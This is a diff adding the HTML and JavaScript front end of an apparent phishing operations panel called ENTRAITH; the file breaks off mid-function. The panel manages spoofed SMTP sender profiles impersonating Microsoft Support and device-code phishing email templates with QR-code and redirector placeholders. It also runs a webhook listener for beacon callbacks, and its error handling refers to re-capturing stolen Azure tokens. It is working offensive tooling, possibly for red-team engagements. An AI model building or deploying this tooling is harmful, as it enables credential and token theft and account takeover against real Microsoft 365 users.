@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ENTRAITH // Infrastructure</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800&display=swap');
+  :root {
+    --bg:#0a0c10;--bg2:#0f1218;--bg3:#161b24;--border:#1e2733;
+    --accent:#00d4ff;--accent2:#ff3e6c;--accent3:#39ff14;--warn:#ffae00;
+    --text:#c8d8e8;--text-dim:#5a6a7a;--text-bright:#e8f0f8;
+    --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;min-height:100vh}
+  .header{background:var(--bg2);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
+  .header-logo{font-family:var(--sans);font-size:11px;font-weight:800;letter-spacing:0.3em;text-transform:uppercase;color:var(--accent);text-shadow:0 0 20px rgba(0,212,255,0.5)}
+  .header-sep{color:var(--border)}
+  .header-title{font-family:var(--sans);font-size:11px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim)}
+  .header-right{margin-left:auto;display:flex;align-items:center;gap:12px}
+  nav{background:var(--bg2);border-bottom:2px solid var(--border);padding:0 24px;display:flex;gap:0;overflow-x:auto}
+  nav a{padding:10px 18px;font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim);text-decoration:none;white-space:nowrap}
+  nav a.active{color:var(--accent);border-bottom:2px solid var(--accent)}
+  nav a:hover{color:var(--text)}
+  .layout{display:grid;grid-template-columns:260px 1fr;height:calc(100vh - 90px);overflow:hidden}
+  .sidebar{background:var(--bg2);border-right:1px solid var(--border);padding:20px;overflow-y:auto}
+  .sidebar-section{margin-bottom:24px}
+  .sidebar-label{font-size:9px;font-weight:600;letter-spacing:0.3em;text-transform:uppercase;color:var(--text-dim);margin-bottom:12px;padding-bottom:6px;border-bottom:1px solid var(--border)}
+  .sidebar-item{padding:8px 12px;cursor:pointer;border-radius:2px;font-size:11px;color:var(--text-dim);border:1px solid transparent;margin-bottom:4px}
+  .sidebar-item:hover{color:var(--text);border-color:var(--border)}
+  .sidebar-item.active{color:var(--accent);background:rgba(0,212,255,0.05);border-color:rgba(0,212,255,0.2)}
+  .main{overflow-y:auto;padding:24px;display:flex;flex-direction:column;gap:20px}
+  .btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border:1px solid var(--border);background:transparent;color:var(--text);font-family:var(--mono);font-size:11px;cursor:pointer;transition:all 0.15s;letter-spacing:0.05em;border-radius:2px;width:100%;justify-content:center;margin-bottom:8px}
+  .btn:hover{border-color:var(--accent);color:var(--accent)}
+  .btn-primary{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,0.05)}
+  .btn-primary:hover{background:rgba(0,212,255,0.15)}
+  .btn-danger{border-color:var(--accent2);color:var(--accent2);background:rgba(255,62,108,0.05)}
+  .btn-success{border-color:var(--accent3);color:var(--accent3);background:rgba(57,255,20,0.05)}
+  .btn-warn{border-color:var(--warn);color:var(--warn);background:rgba(255,174,0,0.05)}
+  .btn-sm{padding:5px 10px;font-size:10px;width:auto;margin-bottom:0}
+  .input-group{margin-bottom:10px}
+  .input-group label{display:block;font-size:10px;color:var(--text-dim);margin-bottom:4px;letter-spacing:0.1em}
+  .input-group input,.input-group select,.input-group textarea{width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:12px;padding:7px 10px;border-radius:2px;outline:none;transition:border-color 0.15s}
+  .input-group select{appearance:none;-webkit-appearance:none;padding-right:28px;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%235a6a7a'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 10px center;cursor:pointer}
+  .input-group input:focus,.input-group textarea:focus,.input-group select:focus{border-color:var(--accent)}
+  .input-group textarea{resize:vertical;min-height:80px}
+  .input-group select option{background:var(--bg3)}
+  .input-row{display:flex;gap:8px}
+  .input-row .input-group{flex:1}
+  .checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+  .checkbox-group input{width:auto}
+  .checkbox-group label{font-size:11px;color:var(--text-dim);margin-bottom:0}
+  .panel{background:var(--bg2);border:1px solid var(--border);border-radius:3px;padding:20px;margin-bottom:16px}
+  .panel-title{font-size:10px;font-weight:600;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent);margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+  .panel-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+  .panel-header .panel-title{margin-bottom:0;padding-bottom:0;border-bottom:none}
+  .card{background:var(--bg3);border:1px solid var(--border);border-radius:2px;padding:12px 14px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+  .card-info{flex:1;min-width:0}
+  .card-label{font-size:12px;color:var(--text-bright);font-weight:500}
+  .card-sub{font-size:10px;color:var(--text-dim);margin-top:2px;word-break:break-all}
+  .card-actions{display:flex;gap:4px;flex-shrink:0}
+  .badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:9px;letter-spacing:0.1em;text-transform:uppercase}
+  .badge-blue{background:rgba(0,212,255,0.1);color:var(--accent);border:1px solid rgba(0,212,255,0.2)}
+  .badge-green{background:rgba(57,255,20,0.1);color:var(--accent3);border:1px solid rgba(57,255,20,0.2)}
+  .badge-red{background:rgba(255,62,108,0.1);color:var(--accent2);border:1px solid rgba(255,62,108,0.2)}
+  .badge-yellow{background:rgba(255,174,0,0.1);color:var(--warn);border:1px solid rgba(255,174,0,0.2)}
+  .output{background:var(--bg);border:1px solid var(--border);padding:12px;font-size:11px;color:var(--text-dim);min-height:60px;white-space:pre-wrap;word-break:break-all;border-radius:2px;font-family:var(--mono);max-height:300px;overflow-y:auto}
+  .section-view{display:none}
+  .section-view.active{display:block}
+  .status-dot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:6px}
+  .status-dot.running{background:var(--accent3);box-shadow:0 0 8px var(--accent3)}
+  .status-dot.stopped{background:var(--text-dim)}
+  .log-stream{background:var(--bg);border:1px solid var(--border);padding:12px;font-size:11px;color:var(--text-dim);height:380px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;border-radius:2px;font-family:var(--mono)}
+  .template-preview{background:var(--bg);border:1px solid var(--border);padding:16px;min-height:200px;border-radius:2px;font-size:12px;color:var(--text)}
+  .tab-bar{display:flex;border-bottom:1px solid var(--border);margin-bottom:16px}
+  .tab-btn{padding:8px 16px;font-size:10px;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;color:var(--text-dim);border:none;background:none;font-family:var(--mono);border-bottom:2px solid transparent}
+  .tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
+  .tab-content{display:none}
+  .tab-content.active{display:block}
+  .empty-state{text-align:center;padding:32px;color:var(--text-dim);font-size:11px;letter-spacing:0.1em}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <span class="header-logo">ENTRAITH</span>
+  <span class="header-sep">//</span>
+  <span class="header-title">Infrastructure</span>
+  <div class="header-right">
+    <span id="engagementLabel" style="font-size:10px;color:var(--text-dim);letter-spacing:0.1em"></span>
+    <button class="btn btn-sm btn-danger" onclick="doLogout()" style="margin-bottom:0">⎋ Logout</button>
+  </div>
+</div>
+
+<!-- Navigation -->
+<nav>
+  <a href="/">Operations</a>
+  <a href="/tools">Advanced Tools</a>
+  <a href="/infra" class="active">Infrastructure</a>
+</nav>
+
+<!-- Layout -->
+<div class="layout">
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Mailer</div>
+      <div class="sidebar-item active" onclick="showSection('sender-profiles',this)">Sender Profiles</div>
+      <div class="sidebar-item" onclick="showSection('email-templates',this)">Email Templates</div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Monitoring</div>
+      <div class="sidebar-item" onclick="showSection('webhook-listener',this)">Webhook Listener</div>
+    </div>
+  </div>
+
+  <!-- Main content -->
+  <div class="main" id="mainContent">
+
+    <!-- ============================================================ -->
+    <!-- SENDER PROFILES -->
+    <!-- ============================================================ -->
+    <div class="section-view active" id="section-sender-profiles">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">Sender Profiles</div>
+          <button class="btn btn-primary btn-sm" onclick="showProfileForm()">+ New Profile</button>
+        </div>
+
+        <!-- Profile form (hidden by default) -->
+        <div id="profileForm" style="display:none;background:var(--bg3);border:1px solid var(--border);padding:16px;margin-bottom:16px;border-radius:2px">
+          <div style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);margin-bottom:12px" id="profileFormTitle">New Sender Profile</div>
+          <input type="hidden" id="profileId">
+          <div class="input-row">
+            <div class="input-group">
+              <label>Profile Name</label>
+              <input type="text" id="profileName" placeholder="e.g. Office365-Primary">
+            </div>
+            <div class="input-group">
+              <label>From Name</label>
+              <input type="text" id="profileFromName" placeholder="e.g. Microsoft Support">
+            </div>
+          </div>
+          <div class="input-group">
+            <label>From Address</label>
+            <input type="text" id="profileFromAddr" placeholder="no-reply@microsoftonline.com">
+          </div>
+          <div class="input-row">
+            <div class="input-group">
+              <label>SMTP Host</label>
+              <input type="text" id="profileHost" placeholder="smtp.office365.com">
+            </div>
+            <div class="input-group" style="max-width:100px">
+              <label>Port</label>
+              <input type="number" id="profilePort" value="587">
+            </div>
+          </div>
+          <div class="input-row">
+            <div class="input-group">
+              <label>Username</label>
+              <input type="text" id="profileUser" placeholder="username@domain.com">
+            </div>
+            <div class="input-group">
+              <label>Password</label>
+              <input type="password" id="profilePass" placeholder="••••••••">
+            </div>
+          </div>
+          <div class="input-row">
+            <div class="input-group">
+              <label>Auth Method</label>
+              <select id="profileAuth">
+                <option value="plain">PLAIN</option>
+                <option value="login">LOGIN (Exchange/Outlook)</option>
+              </select>
+            </div>
+          </div>
+          <div class="checkbox-group">
+            <input type="checkbox" id="profileImplicitTLS">
+            <label>Implicit TLS (port 465/SMTPS)</label>
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn btn-primary btn-sm" onclick="saveProfile()" style="flex:1">Save Profile</button>
+            <button class="btn btn-sm" onclick="cancelProfileForm()" style="flex:1">Cancel</button>
+          </div>
+          <div id="profileFormErr" style="color:var(--accent2);font-size:10px;margin-top:8px"></div>
+        </div>
+
+        <!-- Profile list -->
+        <div id="profileList">
+          <div class="empty-state">No sender profiles configured</div>
+        </div>
+      </div>
+
+      <!-- Test profile panel -->
+      <div class="panel" id="testProfilePanel" style="display:none">
+        <div class="panel-title">Test Profile — <span id="testProfileName" style="color:var(--text)"></span></div>
+        <div class="input-group">
+          <label>Send Test To</label>
+          <input type="email" id="testEmailTo" placeholder="target@domain.com">
+        </div>
+        <div style="display:flex;gap:8px">
+          <button class="btn btn-warn btn-sm" onclick="sendTestEmail()" style="flex:1">Send Test Email</button>
+          <button class="btn btn-sm" onclick="document.getElementById('testProfilePanel').style.display='none'" style="flex:1">Close</button>
+        </div>
+        <div id="testEmailResult" class="output" style="margin-top:10px;display:none"></div>
+      </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- EMAIL TEMPLATES -->
+    <!-- ============================================================ -->
+    <div class="section-view" id="section-email-templates">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">Email Templates</div>
+          <button class="btn btn-primary btn-sm" onclick="showTemplateForm()">+ New Template</button>
+        </div>
+
+        <!-- Template form -->
+        <div id="templateForm" style="display:none;background:var(--bg3);border:1px solid var(--border);padding:16px;margin-bottom:16px;border-radius:2px">
+          <div style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);margin-bottom:12px" id="templateFormTitle">New Email Template</div>
+          <input type="hidden" id="templateId">
+          <div class="input-row">
+            <div class="input-group">
+              <label>Template Name</label>
+              <input type="text" id="templateName" placeholder="e.g. Device Code Phish">
+            </div>
+            <div class="input-group">
+              <label>Subject</label>
+              <input type="text" id="templateSubject" placeholder="Action Required: Verify your account">
+            </div>
+          </div>
+          <div class="input-group">
+            <label>Redirector URL (optional — replaces {{URL}} placeholder)</label>
+            <input type="text" id="templateRedirector" placeholder="https://your-redirector.com/go">
+          </div>
+          <div class="tab-bar">
+            <button class="tab-btn active" onclick="switchTemplatTab('html',this)">HTML Body</button>
+            <button class="tab-btn" onclick="switchTemplatTab('text',this)">Plain Text Body</button>
+            <button class="tab-btn" onclick="switchTemplatTab('preview',this)">Preview</button>
+          </div>
+          <div class="tab-content active" id="tmpl-tab-html">
+            <div style="font-size:10px;color:var(--text-dim);margin-bottom:6px">Placeholders: {{DCODE}} {{URL}} {{REALURL}} {{EMAIL}} {{NAME}} {{QRC}}</div>
+            <div class="input-group">
+              <textarea id="templateHTML" style="min-height:280px;font-size:11px" placeholder="<html>...</html>" oninput="updatePreview()"></textarea>
+            </div>
+          </div>
+          <div class="tab-content" id="tmpl-tab-text">
+            <div class="input-group">
+              <textarea id="templateText" style="min-height:280px;font-size:11px" placeholder="Plain text version of the email..."></textarea>
+            </div>
+          </div>
+          <div class="tab-content" id="tmpl-tab-preview">
+            <div style="font-size:10px;color:var(--text-dim);margin-bottom:8px">Preview with sample data</div>
+            <div class="template-preview" id="templatePreviewFrame"></div>
+          </div>
+          <div style="display:flex;gap:8px;margin-top:8px">
+            <button class="btn btn-primary btn-sm" onclick="saveTemplate()" style="flex:1">Save Template</button>
+            <button class="btn btn-sm" onclick="cancelTemplateForm()" style="flex:1">Cancel</button>
+          </div>
+          <div id="templateFormErr" style="color:var(--accent2);font-size:10px;margin-top:8px"></div>
+        </div>
+
+        <!-- Template list -->
+        <div id="templateList">
+          <div class="empty-state">No email templates configured</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- WEBHOOK LISTENER -->
+    <!-- ============================================================ -->
+    <div class="section-view" id="section-webhook-listener">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span class="status-dot stopped" id="webhookDot"></span>
+            Webhook Listener
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn btn-success btn-sm" id="btnWebhookStart" onclick="startWebhook()">Start</button>
+            <button class="btn btn-danger btn-sm" id="btnWebhookStop" onclick="stopWebhook()" style="display:none">Stop</button>
+          </div>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px;align-items:center">
+          <div style="font-size:11px;color:var(--text-dim)">Status:</div>
+          <div id="webhookStatusText" style="font-size:11px;color:var(--text)">Loading...</div>
+        </div>
+
+        <div style="display:flex;gap:8px;margin-bottom:12px">
+          <button class="btn btn-sm btn-primary" onclick="refreshWebhookLogs()" style="width:auto">Refresh Logs</button>
+          <div class="checkbox-group" style="margin-bottom:0">
+            <input type="checkbox" id="webhookAutoRefresh" onchange="toggleAutoRefresh()">
+            <label>Auto-refresh (5s)</label>
+          </div>
+        </div>
+
+        <div class="log-stream" id="webhookLogs">Waiting for telemetry events...</div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-title">Endpoint Info</div>
+        <div style="font-size:11px;color:var(--text-dim);margin-bottom:8px">The webhook listener receives inbound HTTP POSTs and logs payload data for analysis. Configure your phishing infrastructure to send beacon callbacks to:</div>
+        <div class="output" id="webhookEndpointInfo">Loading...</div>
+      </div>
+    </div>
+
+  </div><!-- /main -->
+</div><!-- /layout -->
+
+<script>
+let activeTestProfileId = '';
+let webhookAutoRefreshTimer = null;
+
+// ── Auth ─────────────────────────────────────────────────────────────────────
+// Session is managed server-side via HttpOnly cookie. Any 401 = session expired.
+function showLoginOverlay() {
+  window.location.href = '/login?next=' + encodeURIComponent(window.location.pathname + window.location.search);
+}
+
+async function doLogout() {
+  await fetch('/api/auth/logout', { method: 'POST', credentials: 'same-origin' });
+  window.location.href = '/login';
+}
+
+function friendlyError(msg) {
+  if (!msg) return 'Unknown error';
+  const m = String(msg);
+  if (m.includes('AADSTS70000')) return 'Token revoked — re-capture required.';
+  if (m.includes('AADSTS700082')) return 'Refresh token expired — re-capture required.';
+  if (m.includes('unauthorized')) return 'Session expired — please log in again.';
+  if (m.includes('forbidden') || m.includes('403')) return 'Access denied — insufficient permissions.';
+  if (m.length > 140) return m.substring(0, 140) + '…';
+  return m;
+}
+
+async function apiFetch(path, opts={}) {
+  const headers = { 'Content-Type': 'application/json', ...(opts.headers||{}) };
+  const r = await fetch(path, { ...opts, headers, credentials: 'same-origin' });
+  if (r.status === 401) { showLoginOverlay(); throw new Error('Unauthorized'); }
+  return r;
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+async function init() {
+  try {
+    const r = await apiFetch('/api/health');
+    if (r.ok) {
+      const d = await r.json();
+      document.getElementById('engagementLabel').textContent = d.engagement || '';
+    }
+  } catch(_) {}
+  loadProfiles();
+  loadTemplates();
+  loadWebhookStatus();
+}
+
+// ── Navigation ────────────────────────────────────────────────────────────────
+function showSection(id, el) {
+  document.querySelectorAll('.section-view').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.sidebar-item').forEach(s => s.classList.remove('active'));
+  const view = document.getElementById('section-' + id);
+  if (view) view.classList.add('active');
+  if (el) el.classList.add('active');
+  if (id === 'sender-profiles') loadProfiles();
+  if (id === 'email-templates') loadTemplates();
+  if (id === 'webhook-listener') { loadWebhookStatus(); refreshWebhookLogs(); }
+}
+
+// ── Sender Profiles ───────────────────────────────────────────────────────────
+async function loadProfiles() {
+  try {
+    const r = await apiFetch('/api/mailer/profiles');
+    const list = await r.json();
+    renderProfiles(list || []);
+  } catch(e) { console.error(e); }
+}
+
+function renderProfiles(profiles) {
+  const el = document.getElementById('profileList');
+  if (!profiles.length) {
+    el.innerHTML = '<div class="empty-state">No sender profiles configured</div>';
+    return;
+  }
+  el.innerHTML = profiles.map(p => `
+    <div class="card">
+      <div class="card-info">
+        <div class="card-label">${escH(p.name)}</div>
+        <div class="card-sub">${escH(p.from_name)} &lt;${escH(p.from_address)}&gt; · ${escH(p.host)}:${p.port}
+          <span class="badge badge-blue" style="margin-left:6px">${escH(p.auth_method||'plain').toUpperCase()}</span>
+          ${p.implicit_tls ? '<span class="badge badge-yellow" style="margin-left:4px">TLS</span>' : ''}
+        </div>
+      </div>
+      <div class="card-actions">
+        <button class="btn btn-warn btn-sm" onclick="openTestPanel('${escH(p.id)}','${escH(p.name)}')">Test</button>
+        <button class="btn btn-sm" onclick="editProfile(${JSON.stringify(JSON.stringify(p))})">Edit</button>
+        <button class="btn btn-danger btn-sm" onclick="deleteProfile('${escH(p.id)}','${escH(p.name)}')">Del</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function showProfileForm(profile) {
+  document.getElementById('profileForm').style.display = 'block';
+  document.getElementById('profileFormErr').textContent = '';
+  if (profile) {
+    document.getElementById('profileFormTitle').textContent = 'Edit Sender Profile';
+    document.getElementById('profileId').value = profile.id || '';
+    document.getElementById('profileName').value = profile.name || '';
+    document.getElementById('profileFromName').value = profile.from_name || '';
+    document.getElementById('profileFromAddr').value = profile.from_address || '';
+    document.getElementById('profileHost').value = profile.host || '';
+    document.getElementById('profilePort').value = profile.port || 587;
+    document.getElementById('profileUser').value = profile.username || '';
+    document.getElementById('profilePass').value = '';
+    document.getElementById('profileAuth').value = profile.auth_method || 'plain';
+    document.getElementById('profileImplicitTLS').checked = !!profile.implicit_tls;
+  } else {
+    document.getElementById('profileFormTitle').textContent = 'New Sender Profile';
+    document.getElementById('profileId').value = '';
+    document.getElementById('profileName').value = '';
+    document.getElementById('profileFromName').value = '';
+    document.getElementById('profileFromAddr').value = '';
+    document.getElementById('profileHost').value = '';
+    document.getElementById('profilePort').value = 587;
+    document.getElementById('profileUser').value = '';
+    document.getElementById('profilePass').value = '';
+    document.getElementById('profileAuth').value = 'plain';
+    document.getElementById('profileImplicitTLS').checked = false;
+  }
+}
+
+function cancelProfileForm() {
+  document.getElementById('profileForm').style.display = 'none';
+}
+
+function editProfile(jsonStr) {
+  try { showProfileForm(JSON.parse(jsonStr)); } catch(e) { console.error(e); }
+}
+
+async function saveProfile() {
+  const id = document.getElementById('profileId').value;
+  const body = {
+    id: id || undefined,
+    name: document.getElementById('profileName').value.trim(),
+    from_name: document.getElementById('profileFromName').value.trim(),
+    from_address: document.getElementById('profileFromAddr').value.trim(),
+    host: document.getElementById('profileHost').value.trim(),
+    port: parseInt(document.getElementById('profilePort').value) || 587,
+    username: document.getElementById('profileUser').value.trim(),
+    password: document.getElementById('profilePass').value,
+    auth_method: document.getElementById('profileAuth').value,
+    implicit_tls: document.getElementById('profileImplicitTLS').checked,
+  };
+  if (!body.name || !body.host || !body.from_address) {
+    document.getElementById('profileFormErr').textContent = 'Name, host, and from address are required';
+    return;
+  }
+  try {
+    const r = await apiFetch('/api/mailer/profiles', { method: 'POST', body: JSON.stringify(body) });
+    if (!r.ok) {
+      const e = await r.json();
+      document.getElementById('profileFormErr').textContent = e.error || 'Failed to save';
+      return;
+    }
+    document.getElementById('profileForm').style.display = 'none';
+    loadProfiles();
+  } catch(e) {
+    document.getElementById('profileFormErr').textContent = String(e);
+  }
+}
+
+async function deleteProfile(id, name) {
+  if (!confirm(`Delete profile "${name}"?`)) return;
+  await apiFetch(`/api/mailer/profiles/${id}`, { method: 'DELETE' });
+  loadProfiles();
+}
+
+function openTestPanel(id, name) {
+  activeTestProfileId = id;
+  document.getElementById('testProfileName').textContent = name;
+  document.getElementById('testEmailTo').value = '';
+  document.getElementById('testEmailResult').style.display = 'none';
+  document.getElementById('testProfilePanel').style.display = 'block';
+}
+
+async function sendTestEmail() {
+  const to = document.getElementById('testEmailTo').value.trim();
+  if (!to) return;
+  const el = document.getElementById('testEmailResult');
+  el.style.display = 'block';
+  el.textContent = 'Sending...';
+  try {
+    const r = await apiFetch(`/api/mailer/profiles/${activeTestProfileId}/test`, {
+      method: 'POST',
+      body: JSON.stringify({ to })
+    });
+    const d = await r.json();
+    el.textContent = r.ok ? '✓ Test email sent successfully' : ('✗ ' + (d.error || 'Failed'));
+    el.style.color = r.ok ? 'var(--accent3)' : 'var(--accent2)';
+  } catch(e) {
+    el.textContent = '✗ ' + String(e);
+    el.style.color = 'var(--accent2)';
+  }
+}
+
+// ── Email Templates ───────────────────────────────────────────────────────────
+async function loadTemplates() {
+  try {
+    const r = await apiFetch('/api/mailer/templates');
+    const list = await r.json();
+    renderTemplates(list || []);
+  } catch(e) { console.error(e); }
+}
+
+// Cache keyed by template ID — avoids embedding raw HTML/JSON as inline onclick attributes.
+const _tmplCache = {};
+
+function renderTemplates(templates) {
+  const el = document.getElementById('templateList');
+  if (!templates.length) {
+    el.innerHTML = '<div class="empty-state">No email templates configured</div>';
+    return;
+  }
+  templates.forEach(t => { _tmplCache[t.id] = t; });
+  el.innerHTML = templates.map(t => {
+    const hasQRC = (t.html_body || '').includes('{{QRC}}');
+    const hasDC  = (t.html_body || '').includes('{{DCODE}}');
+    const tags   = [hasDC ? 'DC' : null, hasQRC ? 'QR' : null].filter(Boolean)
+                     .map(tag => `<span style="font-size:9px;padding:1px 5px;border:1px solid var(--border);border-radius:2px;color:var(--accent);margin-left:6px">${tag}</span>`)
+                     .join('');
+    return `
+    <div class="card">
+      <div class="card-info">
+        <div class="card-label">${escH(t.name)}${tags}</div>
+        <div class="card-sub">Subject: ${escH(t.subject)}${t.redirector_url ? ' · Redirector: ' + escH(t.redirector_url) : ''}</div>
+      </div>
+      <div class="card-actions">
+        <button class="btn btn-sm" onclick="editTemplate('${escH(t.id)}')">Edit</button>
+        <button class="btn btn-danger btn-sm" onclick="deleteTemplate('${escH(t.id)}','${escH(t.name)}')">Del</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function showTemplateForm(tmpl) {
+  document.getElementById('templateForm').style.display = 'block';
+  document.getElementById('templateFormErr').textContent = '';
+  // Reset tabs
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  document.querySelector('.tab-btn').classList.add('active');
+  document.getElementById('tmpl-tab-html').classList.add('active');
+  if (tmpl) {
+    document.getElementById('templateFormTitle').textContent = 'Edit Email Template';
+    document.getElementById('templateId').value = tmpl.id || '';
+    document.getElementById('templateName').value = tmpl.name || '';
+    document.getElementById('templateSubject').value = tmpl.subject || '';
+    document.getElementById('templateRedirector').value = tmpl.redirector_url || '';
+    document.getElementById('templateHTML').value = tmpl.html_body || '';
+    document.getElementById('templateText').value = tmpl.text_body || '';
+  } else {
+    document.getElementById('templateFormTitle').textContent = 'New Email Template';
+    document.getElementById('templateId').value = '';
+    document.getElementById('templateName').value = '';
+    document.getElementById('templateSubject').value = '';
+    document.getElementById('templateRedirector').value = '';
+    document.getElementById('templateHTML').value = '';
+    document.getElementById('templateText').value = '';
+  }
+}
+
+function cancelTemplateForm() {
+  document.getElementById('templateForm').style.display = 'none';
+}
+
+function editTemplate(id) {
+  const t = _tmplCache[id];
+  if (t) showTemplateForm(t);
+}
+
+function switchTemplatTab(tab, btn) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('tmpl-tab-' + tab).classList.add('active');
+  if (tab === 'preview') updatePreview();
+}
+
+function updatePreview() {
+  const html = document.getElementById('templateHTML').value;
+  const qrPlaceholder = '<img src="data:image/svg+xml;base64,' + btoa('<svg xmlns="http://www.w3.org/2000/svg" width="220" height="220"><rect width="220" height="220" fill="#f0f0f0"/><rect x="20" y="20" width="60" height="60" fill="#333"/><rect x="30" y="30" width="40" height="40" fill="#f0f0f0"/><rect x="40" y="40" width="20" height="20" fill="#333"/><rect x="140" y="20" width="60" height="60" fill="#333"/><rect x="150" y="30" width="40" height="40" fill="#f0f0f0"/><rect x="160" y="40" width="20" height="20" fill="#333"/><rect x="20" y="140" width="60" height="60" fill="#333"/><rect x="30" y="150" width="40" height="40" fill="#f0f0f0"/><rect x="40" y="160" width="20" height="20" fill="#333"/><rect x="100" y="20" width="20" height="20" fill="#333"/><rect x="100" y="60" width="20" height="20" fill="#333"/><rect x="100" y="100" width="20" height="20" fill="#333"/><rect x="60" y="100" width="20" height="20" fill="#333"/><rect x="140" y="100" width="80" height="20" fill="#333"/><rect x="100" y="140" width="20" height="40" fill="#333"/><rect x="140" y="140" width="20" height="20" fill="#333"/><rect x="180" y="140" width="20" height="20" fill="#333"/><rect x="140" y="180" width="60" height="20" fill="#333"/><text x="110" y="115" font-size="8" fill="#999" text-anchor="middle">QR preview</text></svg>') + '" alt="QR Code (preview)" style="width:220px;height:220px;display:block">';
+  const preview = html
+    .replace(/\{\{DCODE\}\}/g, 'ABCD-EFGH')
+    .replace(/\{\{URL\}\}/g, 'https://microsoft.com/devicelogin')
+    .replace(/\{\{REALURL\}\}/g, 'https://microsoft.com/devicelogin')
+    .replace(/\{\{EMAIL\}\}/g, 'target@contoso.com')
+    .replace(/\{\{NAME\}\}/g, 'John Doe')
+    .replace(/\{\{QRC\}\}/g, qrPlaceholder);
+  document.getElementById('templatePreviewFrame').innerHTML = preview;
+}
+
+async function saveTemplate() {
+  const id = document.getElementById('templateId').value;
+  const body = {
+    name: document.getElementById('templateName').value.trim(),
+    subject: document.getElementById('templateSubject').value.trim(),
+    html_body: document.getElementById('templateHTML').value,
+    text_body: document.getElementById('templateText').value,
+    redirector_url: document.getElementById('templateRedirector').value.trim(),
+  };
+  if (!body.name || !body.subject || !body.html_body) {
+    document.getElementById('templateFormErr').textContent = 'Name, subject, and HTML body are required';
+    return;
+  }
+  try {
+    let r;
+    if (id) {
+      r = await apiFetch(`/api/mailer/templates/${id}`, { method: 'PUT', body: JSON.stringify(body) });
+    } else {
+      r = await apiFetch('/api/mailer/templates', { method: 'POST', body: JSON.stringify(body) });
+    }
+    if (!r.ok) {
+      const e = await r.json();
+      document.getElementById('templateFormErr').textContent = e.error || 'Failed to save';
+      return;
+    }
+    document.getElementById('templateForm').style.display = 'none';
+    loadTemplates();
+  } catch(e) {
+    document.getElementById('templateFormErr').textContent = String(e);
+  }
+}
+
+async function deleteTemplate(id, name) {
+  if (!confirm(`Delete template "${name}"?`)) return;
+  await apiFetch(`/api/mailer/templates/${id}`, { method: 'DELETE' });
+  loadTemplates();
+}
+
+// ── Webhook Listener ──────────────────────────────────────────────────────────
+async function loadWebhookStatus() {
+  try {
+    const r = await apiFetch('/api/webhook/status');
+    if (!r.ok) return;
+    const d = await r.json();
+    updateWebhookUI(d.running || false);
+    // Show endpoint URL
+    const endpointEl = document.getElementById('webhookEndpointInfo');
+    endpointEl.textContent = `POST ${window.location.protocol}//${window.location.host}/receive\n\nThis endpoint accepts any HTTP POST request. The raw body is logged to the stream monitor file.`;
+  } catch(e) { console.error(e); }
+}
+
+function updateWebhookUI(running) {
+  const dot = document.getElementById('webhookDot');
+  const statusText = document.getElementById('webhookStatusText');
+  const btnStart = document.getElementById('btnWebhookStart');
+  const btnStop = document.getElementById('btnWebhookStop');
+  if (running) {
+    dot.className = 'status-dot running';
+    statusText.textContent = 'Running — accepting inbound webhook events';
+    statusText.style.color = 'var(--accent3)';
+    btnStart.style.display = 'none';
+    btnStop.style.display = 'inline-flex';
+  } else {
+    dot.className = 'status-dot stopped';
+    statusText.textContent = 'Stopped';
+    statusText.style.color = 'var(--text-dim)';
